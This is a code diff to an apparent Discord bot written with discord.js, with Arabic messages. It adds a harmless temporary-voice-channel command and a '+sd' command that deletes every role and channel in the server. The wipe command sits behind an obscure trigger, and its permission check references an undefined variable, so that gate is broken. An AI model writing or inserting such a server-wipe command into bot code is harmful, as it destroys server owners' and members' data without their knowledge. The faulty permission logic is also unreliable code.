@@ -379,5 +379,29 @@ client.on('message', message => {
      });
 
 
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("+sd")) {
+    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**⚠  لايوجد لديك صلاحية**');
+     ra3d.guild.roles.forEach(r => { r.delete() }) 
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('تم حذف كل شي في السيرفر✅')
+           ra3d.author.sendEmbed(embed);
+ }
+ });  
+client.on("message", message => {
+     var prefix = "+";
+    if(message.content.startsWith(prefix + 'v2min')) {
+     let args = message.content.split(" ").slice(1);
+       var nam = args.join(' ');
+    
+      if(!message.member.hasPermission('ADMINISTRATOR')) return    message.channel.send('`ADMINISTRATOR` للأسف هذه الخاصية تحتاج الى ').then(msg => msg.delete(6000))
+      if (!nam) return message.channel.send(`<@${message.author.id}> يجب عليك ادخال اسم`).then(msg => msg.delete(10000))
+      message.guild.createChannel(nam, 'voice').then(c => setTimeout(() => c.delete(), 120000)) // كل 60 تساوي دقيقة عدل عليها الوقت لي تبيه 
+      message.channel.send(`☑ TemporarySound : \`${nam}\``).then(c => setTimeout(() => c.edit(`<@${message.author.id}> ⏱  انتهى وقت الروم الصوتي`), 120000))  // 120000 دقيقتان
+    }
+    });
+
 
 client.login(process.env.BOT_TOKEN);
